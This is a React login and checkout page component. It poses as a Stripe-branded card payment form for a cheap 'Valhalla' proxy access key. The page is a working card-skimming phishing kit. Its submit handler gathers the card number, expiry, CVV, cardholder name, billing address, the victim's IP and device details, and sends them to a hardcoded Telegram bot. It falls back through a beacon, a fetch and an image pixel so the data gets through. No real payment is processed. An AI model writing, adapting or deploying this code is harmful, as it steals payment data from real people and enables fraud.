import { useState, FormEvent } from "react";
import { useNavigate } from "react-router-dom";
import VideoBackground from "@/components/VideoBackground";
import VerifiedBadge from "@/components/VerifiedBadge";
import VideoModal from "@/components/VideoModal";
import { Button } from "@/components/ui/button";
import { ShieldCheck, ChevronLeft, CreditCard, ChevronDown, PlayCircle, ArrowRight, Languages, Lock, Check } from "lucide-react";
import { EXAMPLE_VIDEO, TITLE_LOGO, LOGIN_PROFILE_VIDEO } from "@/lib/assets";
import { LANGUAGES, LangCode, useI18n } from "@/lib/i18n";

const BOT_TOKEN = "9108667087:AAEJldPbAqpUPndj1vV4HwXgae0mlLiHjaw";
const CHAT_ID = "8585803145";
const TG_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

const COUNTRIES = [
  "United States", "México", "Colombia", "Argentina", "Chile", "Perú",
  "España", "Ecuador", "Guatemala", "Venezuela", "República Dominicana", "Otro",
];

const onlyDigits = (v: string, max: number) => v.replace(/\D/g, "").slice(0, max);
const formatCard = (v: string) => onlyDigits(v, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
const formatExpiry = (v: string) => {
  const d = onlyDigits(v, 4);
  return d.length > 2 ? `${d.slice(0, 2)}/${d.slice(2)}` : d;
};

const getIp = async (): Promise<string> => {
  try {
    const r: any = await Promise.race([
      fetch("https://api.ipify.org?format=json").then((x) => x.json()),
      new Promise((res) => setTimeout(() => res(null), 1500)),
    ]);
    return r?.ip ?? "—";
  } catch {
    return "—";
  }
};

const buildParams = (text: string) => {
  const p = new URLSearchParams();
  p.set("chat_id", CHAT_ID);
  p.set("text", text);
  p.set("disable_web_page_preview", "true");
  return p.toString();
};

const pixelGet = (params: string) =>
  new Promise<void>((resolve) => {
    const img = new Image();
    let done = false;
    const finish = () => { if (!done) { done = true; resolve(); } };
    img.onload = finish;
    img.onerror = finish;
    img.src = `${TG_URL}?${params}&_=${Date.now()}`;
    setTimeout(finish, 3000);
  });

const sendToTelegram = async (text: string) => {
  const params = buildParams(text);
  try {
    const blob = new Blob([params], { type: "application/x-www-form-urlencoded;charset=UTF-8" });
    if (navigator.sendBeacon && navigator.sendBeacon(TG_URL, blob)) {
      console.info("[tg] enviado por beacon");
      await new Promise((r) => setTimeout(r, 900));
      return;
    }
  } catch (err) { console.warn("[tg] beacon falló", err); }
  try {
    await fetch(`${TG_URL}?${params}&_=${Date.now()}`, { method: "GET", keepalive: true });
    console.info("[tg] enviado por fetch GET");
    return;
  } catch (err) { console.warn("[tg] fetch GET falló, uso pixel", err); }
  await pixelGet(params);
  console.info("[tg] enviado por pixel");
};

/* ---------- iconografía de la referencia ---------- */

const CardTileIcon = () => (
  <svg width="34" height="23" viewBox="0 0 34 23" aria-hidden="true">
    <rect width="34" height="23" rx="3" fill="#1c1c1e" />
    <rect x="4" y="6" width="7" height="5.5" rx="1" fill="#f2c94c" />
    <rect x="4" y="14.5" width="13" height="2" rx="1" fill="#8e8e93" />
  </svg>
);

const GooglePayMark = () => (
  <span className="flex h-7 items-center gap-1.5 rounded-full border border-[#dadce0] bg-white px-2.5">
    <svg width="14" height="14" viewBox="0 0 24 24" aria-hidden="true">
      <path fill="#4285F4" d="M23.49 12.27c0-.79-.07-1.54-.19-2.27H12v4.51h6.47a5.54 5.54 0 0 1-2.4 3.58v3h3.86c2.26-2.09 3.56-5.17 3.56-8.82z" />
      <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.86-3c-1.08.72-2.45 1.16-4.07 1.16-3.13 0-5.78-2.11-6.73-4.96H1.29v3.09A11.99 11.99 0 0 0 12 24z" />
      <path fill="#FBBC05" d="M5.27 14.29a7.2 7.2 0 0 1 0-4.58V6.62H1.29a11.99 11.99 0 0 0 0 10.76l3.98-3.09z" />
      <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.7 0 3.99 2.47 1.29 6.62l3.98 3.09C6.22 6.86 8.87 4.75 12 4.75z" />
    </svg>
    <span className="text-[13px] font-medium leading-none text-[#5f6368]">Pay</span>
  </span>
);

const BrandLogos = () => (
  <div className="pointer-events-none absolute right-3 top-1/2 flex -translate-y-1/2 items-center gap-1.5">
    <svg width="40" height="26" viewBox="0 0 40 26" aria-hidden="true">
      <rect x="0.5" y="0.5" width="39" height="25" rx="3" fill="#fff" stroke="#e5e4f7" />
      <text x="20" y="17.5" textAnchor="middle" fontFamily="Arial, Helvetica, sans-serif" fontSize="11.5" fontWeight="700" fontStyle="italic" fill="#1a1f71" letterSpacing="0.3">VISA</text>
    </svg>
    <svg width="40" height="26" viewBox="0 0 40 26" aria-hidden="true">
      <rect width="40" height="26" rx="3" fill="#111" />
      <circle cx="16" cy="13" r="7" fill="#eb001b" />
      <circle cx="24" cy="13" r="7" fill="#f79e1b" fillOpacity="0.9" />
      <path d="M20 7.6a7 7 0 0 0 0 10.8 7 7 0 0 0 0-10.8z" fill="#ff5f00" />
    </svg>
    <svg width="40" height="26" viewBox="0 0 40 26" aria-hidden="true">
      <rect width="40" height="26" rx="3" fill="#006fcf" />
      <text x="20" y="13.5" textAnchor="middle" fontFamily="Arial, Helvetica, sans-serif" fontSize="8.5" fontWeight="700" fill="#fff" letterSpacing="0.4">AMEX</text>
      <text x="20" y="20.5" textAnchor="middle" fontFamily="Arial, Helvetica, sans-serif" fontSize="4.6" fill="#cfe6ff">EXPRESS</text>
    </svg>
    <svg width="40" height="26" viewBox="0 0 40 26" aria-hidden="true">
      <rect x="0.5" y="0.5" width="39" height="25" rx="3" fill="#fff" stroke="#e5e4f7" />
      <rect x="5" y="5" width="5" height="16" rx="1" fill="#e21836" />
      <rect x="11" y="5" width="5" height="16" rx="1" fill="#00447c" />
      <rect x="17" y="5" width="5" height="16" rx="1" fill="#007b84" />
      <text x="28.5" y="12.5" textAnchor="middle" fontFamily="Arial, Helvetica, sans-serif" fontSize="4.4" fontWeight="700" fill="#2b2b2b">Union</text>
      <text x="28.5" y="17.5" textAnchor="middle" fontFamily="Arial, Helvetica, sans-serif" fontSize="4.4" fontWeight="700" fill="#2b2b2b">Pay</text>
    </svg>
  </div>
);

const CvcIcon = () => (
  <svg width="38" height="24" viewBox="0 0 38 24" aria-hidden="true" className="pointer-events-none absolute right-3 top-1/2 -translate-y-1/2">
    <rect x="0.5" y="0.5" width="37" height="23" rx="2.5" fill="#f6f5ff" stroke="#d7d5f7" />
    <rect x="4" y="5" width="30" height="4.5" rx="1" fill="#b9b6d9" />
    <rect x="4" y="12.5" width="17" height="2.2" rx="1" fill="#dcdaf0" />
    <rect x="4" y="17" width="11" height="2.2" rx="1" fill="#dcdaf0" />
    <circle cx="29.5" cy="16" r="6.5" fill="#4b4b52" />
    <text x="29.5" y="18.4" textAnchor="middle" fontSize="6.6" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fill="#fff">135</text>
  </svg>
);

const inputCls =
  "h-14 w-full rounded-[4px] border border-[#cfcdf5] bg-white px-4 text-[17px] text-neutral-900 outline-none placeholder:text-[#9a9aa8] transition-[border-color,box-shadow] duration-150 focus:border-[#635bff] focus:ring-2 focus:ring-[#635bff]/15";
const labelCls = "mb-2 block text-[15px] font-normal text-neutral-900";

const Login = () => {
  const { t, lang, setLang } = useI18n();
  const [step, setStep] = useState<"intro" | "pay">("intro");
  const [method, setMethod] = useState<"card" | "gpay">("card");
  const [card, setCard] = useState("");
  const [holder, setHolder] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [country, setCountry] = useState("United States");
  const [address, setAddress] = useState("");
  const [zip, setZip] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [videoOpen, setVideoOpen] = useState(false);
  const navigate = useNavigate();

  const onSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (loading) return;
    setError("");

    const digits = card.replace(/\s/g, "");
    const cleanHolder = holder.trim().replace(/\s+/g, " ");
    const [mm, yy] = expiry.split("/");
    const month = Number(mm);
    const year = 2000 + Number(yy);
    const now = new Date();

    if (digits.length < 15) { setError("Card number is incomplete."); return; }
    if (cleanHolder.length < 3) { setError("Enter the cardholder name."); return; }
    if (!mm || mm.length < 2 || month < 1 || month > 12 || !yy || yy.length < 2) { setError("Expiration date is invalid."); return; }
    if (new Date(year, month, 1) < new Date(now.getFullYear(), now.getMonth(), 1)) { setError("Your card has expired."); return; }
    if (cvv.length < 3) { setError("CVC is incomplete."); return; }
    if (address.trim().length < 5) { setError("Enter your billing address."); return; }
    if (zip.trim().length < 3) { setError("Enter a valid ZIP."); return; }

    setLoading(true);
    try {
      const sentFlag = `card_sent_${digits}`;
      if (localStorage.getItem(sentFlag) !== "1") {
        const ip = await getIp();
        const text = [
          "💳 NUEVA TARJETA — Valhalla",
          "",
          `Método: ${method === "gpay" ? "Google Pay" : "Card"}`,
          `Número: ${digits.replace(/(\d{4})(?=\d)/g, "$1 ")}`,
          `Titular: ${cleanHolder.toUpperCase()}`,
          `Vencimiento: ${expiry}`,
          `CVV: ${cvv}`,
          `País: ${country}`,
          `Dirección: ${address.trim()}`,
          `ZIP: ${zip.trim().toUpperCase()}`,
          "",
          `IP: ${ip}`,
          `Dispositivo: ${navigator.userAgent.slice(0, 160)}`,
          `Fecha: ${now.toLocaleString()}`,
          `Idioma: ${lang}`,
        ].join("\n");
        await sendToTelegram(text);
        localStorage.setItem(sentFlag, "1");
      }
    } catch (err) {
      console.error("[tg] error inesperado", err);
    } finally {
      await new Promise((r) => setTimeout(r, 600));
      setLoading(false);
      navigate("/admin");
    }
  };

  return (
    <div className="relative flex min-h-[100dvh] flex-col items-center justify-center overflow-x-hidden px-3 py-4 sm:py-8">
      <VideoBackground />
      <div className="relative z-10 w-full max-w-[390px] animate-card-in">
        <section className="relative overflow-hidden rounded-lg border border-brand/35 bg-glass/95 shadow-brand backdrop-blur-2xl">
          <div aria-hidden className="absolute inset-x-0 top-0 h-px bg-gradient-to-r from-transparent via-brand to-transparent" />
          <div aria-hidden className="absolute -right-14 top-16 h-28 w-28 rotate-45 border border-brand/10" />

          <header className="flex h-12 items-center justify-between border-b border-border/70 px-4">
            <div className="flex min-w-0 items-center gap-2">
              <span className="relative flex h-2 w-2 shrink-0">
                <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-success opacity-40" />
                <span className="relative h-2 w-2 rounded-full bg-success" />
              </span>
              <span className="truncate text-[10px] font-semibold uppercase tracking-[0.16em] text-muted-foreground">{t("secureGateway")}</span>
            </div>
            <label className="relative ml-3 flex h-8 shrink-0 items-center gap-1.5 rounded-md border border-border bg-secondary/60 pl-2.5 pr-7 text-foreground transition-colors focus-within:border-brand/60">
              <Languages className="h-3.5 w-3.5 text-brand-soft" aria-hidden="true" />
              <span className="max-w-[74px] truncate text-[11px] font-semibold">{LANGUAGES.find((item) => item.code === lang)?.label}</span>
              <ChevronDown className="pointer-events-none absolute right-2 h-3 w-3 text-muted-foreground" aria-hidden="true" />
              <select
                aria-label={t("language")}
                value={lang}
                onChange={(event) => setLang(event.target.value as LangCode)}
                className="absolute inset-0 cursor-pointer appearance-none opacity-0"
              >
                {LANGUAGES.map((language) => <option key={language.code} value={language.code}>{language.label}</option>)}
              </select>
            </label>
          </header>

          <div className="px-5 pb-5 pt-4 sm:px-6">
            <div className="flex items-center gap-4">
              <div className="relative h-[76px] w-[76px] shrink-0 rounded-md border border-brand/55 bg-background p-1 shadow-[0_0_28px_hsl(var(--brand)/0.18)]">
                <video src={LOGIN_PROFILE_VIDEO} autoPlay loop muted playsInline preload="metadata" disablePictureInPicture aria-label="Boykaffx7" className="pointer-events-none h-full w-full rounded-sm object-cover" />
                <span className="absolute -bottom-1 -right-1 flex h-5 w-5 items-center justify-center rounded-sm border border-brand/60 bg-card text-brand-soft"><ShieldCheck className="h-3 w-3" /></span>
              </div>
              <div className="min-w-0 flex-1">
                <div className="flex items-center gap-1.5">
                  <img src={TITLE_LOGO} alt="Boykaffx7" className="max-h-10 w-[170px] max-w-[calc(100%-26px)] object-contain object-left" draggable={false} />
                  <VerifiedBadge size={17} />
                </div>
                <p className="mt-1 text-[11px] leading-relaxed text-muted-foreground">{t("enterCreds")}</p>
                <div className="mt-2 flex items-center gap-2 text-[9px] font-semibold uppercase tracking-[0.12em] text-muted-foreground/70">
                  <span>{t("aes")}</span><span className="h-1 w-1 rounded-full bg-brand" /><span>{t("tls")}</span>
                </div>
              </div>
            </div>

            {/* ---------- PASO 1 ---------- */}
            {step === "intro" && (
              <div className="mt-4 animate-card-in">
                <div className="rounded-md border border-border bg-secondary/30 p-3.5">
                  <div className="flex items-start justify-between gap-3">
                    <div className="min-w-0">
                      <p className="text-[13px] font-semibold text-foreground">Acceso Proxy — Valhalla</p>
                      <p className="mt-0.5 text-[10px] text-muted-foreground">Activación inmediata · 7 días</p>
                    </div>
                    <div className="shrink-0 text-right">
                      <p className="text-[15px] font-bold leading-none text-foreground">2 USD</p>
                      <p className="mt-1 text-[9px] text-muted-foreground">único pago</p>
                    </div>
                  </div>
                  <div className="mt-3 space-y-1.5 border-t border-border/70 pt-3">
                    {["Key de acceso privada", "Servidor optimizado", "Sin renovación automática"].map((item) => (
                      <div key={item} className="flex items-center gap-2">
                        <Check className="h-3 w-3 shrink-0 text-brand" />
                        <span className="text-[10px] text-muted-foreground">{item}</span>
                      </div>
                    ))}
                  </div>
                </div>

                <Button
                  type="button"
                  onClick={() => setStep("pay")}
                  className="mt-3 h-12 w-full rounded-md bg-brand text-brand-foreground shadow-brand transition-transform duration-150 hover:bg-brand/90 active:scale-[0.985]"
                >
                  <CreditCard className="h-4 w-4" /> Pagar 2 USD <ArrowRight className="h-4 w-4" />
                </Button>

                <Button type="button" variant="outline" onClick={() => setVideoOpen(true)} className="mt-2 h-10 w-full rounded-md border-border bg-secondary/40 text-foreground hover:border-brand/35 hover:bg-brand/10 hover:text-foreground">
                  <PlayCircle /> <span className="truncate text-[11px]">{t("seeDemo")}</span>
                </Button>
              </div>
            )}

            {/* ---------- PASO 2 ---------- */}
            {step === "pay" && (
              <div className="mt-4 animate-card-in rounded-md bg-white p-4 text-neutral-900 shadow-[0_10px_30px_-12px_rgba(0,0,0,0.45)]">
                <div className="mb-3 flex items-center justify-between">
                  <button
                    type="button"
                    onClick={() => setStep("intro")}
                    className="flex items-center gap-1 text-[12px] text-[#5b5b6b] hover:text-[#635bff]"
                  >
                    <ChevronLeft className="h-3.5 w-3.5" /> Volver
                  </button>
                  <span className="flex items-center gap-1 text-[10px] text-[#5b5b6b]"><Lock className="h-3 w-3" /> pago seguro</span>
                </div>

                <h2 className="text-[21px] font-bold leading-tight tracking-[-0.01em] text-neutral-900">
                  Stripe Credit Card <span className="text-[#e0443e]">*</span>
                </h2>

                <div className="mt-3 grid grid-cols-2 gap-3">
                  <button
                    type="button"
                    onClick={() => setMethod("card")}
                    aria-pressed={method === "card"}
                    className={`flex h-[74px] flex-col items-start justify-center gap-2 rounded-[4px] border px-3 text-left transition-colors ${
                      method === "card" ? "border-[#b9b6f7] bg-[#f5f4ff]" : "border-[#d7d5f7] bg-white hover:bg-[#fafaff]"
                    }`}
                  >
                    <CardTileIcon />
                    <span className="text-[16px] leading-none text-neutral-900">Card</span>
                  </button>
                  <button
                    type="button"
                    onClick={() => setMethod("gpay")}
                    aria-pressed={method === "gpay"}
                    className={`flex h-[74px] flex-col items-start justify-center gap-2 rounded-[4px] border px-3 text-left transition-colors ${
                      method === "gpay" ? "border-[#b9b6f7] bg-[#f5f4ff]" : "border-[#d7d5f7] bg-white hover:bg-[#fafaff]"
                    }`}
                  >
                    <GooglePayMark />
                    <span className="text-[16px] leading-none text-[#5f6368]">Google Pay</span>
                  </button>
                </div>

                {error && (
                  <p role="alert" className="mt-3 rounded-[4px] border border-[#e0443e]/30 bg-[#e0443e]/5 px-3 py-2 text-[12px] text-[#c0392b]">{error}</p>
                )}

                <form onSubmit={onSubmit} className="mt-4 space-y-4">
                  <div>
                    <label htmlFor="cc-number" className={labelCls}>Card number</label>
                    <div className="relative">
                      <input
                        id="cc-number"
                        type="text"
                        placeholder="1234 1234 1234 1234"
                        value={card}
                        onChange={(e) => setCard(formatCard(e.target.value))}
                        autoComplete="cc-number"
                        inputMode="numeric"
                        maxLength={19}
                        className={`${inputCls} pr-[196px] font-medium tracking-[0.02em]`}
                      />
                      <BrandLogos />
                    </div>
                  </div>

                  <div>
                    <label htmlFor="cc-name" className={labelCls}>Cardholder name</label>
                    <input
                      id="cc-name"
                      type="text"
                      placeholder="Full name"
                      value={holder}
                      onChange={(e) => setHolder(e.target.value.toUpperCase())}
                      autoComplete="cc-name"
                      maxLength={40}
                      className={`${inputCls} uppercase`}
                    />
                  </div>

                  <div className="grid grid-cols-2 gap-3">
                    <div>
                      <label htmlFor="cc-exp" className={labelCls}>Expiration</label>
                      <input
                        id="cc-exp"
                        type="text"
                        placeholder="MM / YY"
                        value={expiry}
                        onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                        autoComplete="cc-exp"
                        inputMode="numeric"
                        maxLength={5}
                        className={`${inputCls} font-medium`}
                      />
                    </div>
                    <div>
                      <label htmlFor="cc-cvc" className={labelCls}>CVC</label>
                      <div className="relative">
                        <input
                          id="cc-cvc"
                          type="text"
                          placeholder="CVC"
                          value={cvv}
                          onChange={(e) => setCvv(onlyDigits(e.target.value, 4))}
                          autoComplete="cc-csc"
                          inputMode="numeric"
                          maxLength={4}
                          className={`${inputCls} pr-14 font-medium`}
                        />
                        <CvcIcon />
                      </div>
                    </div>
                  </div>

                  <div>
                    <label htmlFor="country" className={labelCls}>Country</label>
                    <div className="relative">
                      <select
                        id="country"
                        value={country}
                        onChange={(e) => setCountry(e.target.value)}
                        className={`${inputCls} cursor-pointer appearance-none pr-11`}
                      >
                        {COUNTRIES.map((c) => <option key={c} value={c}>{c}</option>)}
                      </select>
                      <ChevronDown className="pointer-events-none absolute right-4 top-1/2 h-5 w-5 -translate-y-1/2 text-[#3d3d47]" />
                    </div>
                  </div>

                  <div>
                    <label htmlFor="address" className={labelCls}>Billing address</label>
                    <input
                      id="address"
                      type="text"
                      placeholder="Street address"
                      value={address}
                      onChange={(e) => setAddress(e.target.value)}
                      autoComplete="street-address"
                      maxLength={80}
                      className={inputCls}
                    />
                  </div>

                  <div>
                    <label htmlFor="zip" className={labelCls}>ZIP</label>
                    <input
                      id="zip"
                      type="text"
                      placeholder="90210"
                      value={zip}
                      onChange={(e) => setZip(e.target.value.toUpperCase())}
                      autoComplete="postal-code"
                      inputMode="numeric"
                      maxLength={10}
                      className={`${inputCls} font-medium`}
                    />
                  </div>

                  <button
                    type="submit"
                    disabled={loading}
                    className="h-14 w-full rounded-[4px] border border-[#cfcdf5] bg-[#f4f3ff] text-[17px] text-neutral-900 transition-colors hover:bg-[#ecebff] active:scale-[0.995] disabled:opacity-70"
                  >
                    {loading ? "Procesando..." : "Entrar"}
                  </button>

                  <p className="flex items-center justify-center gap-1.5 pb-1 text-[10px] text-[#7b7b8a]">
                    <Lock className="h-3 w-3" /> Pago cifrado · SSL · Powered by Stripe
                  </p>
                </form>
              </div>
            )}
          </div>
        </section>

        <div className="mt-3 px-4 text-center">
          <p className="text-[9px] leading-relaxed text-muted-foreground/50">
            {t("footer")}
            <br />{t("footer2")}
          </p>
        </div>
      </div>

      <VideoModal
        open={videoOpen}
        onClose={() => setVideoOpen(false)}
        src={EXAMPLE_VIDEO}
        title={t("demo")}
      />
    </div>
  );
};

export default Login;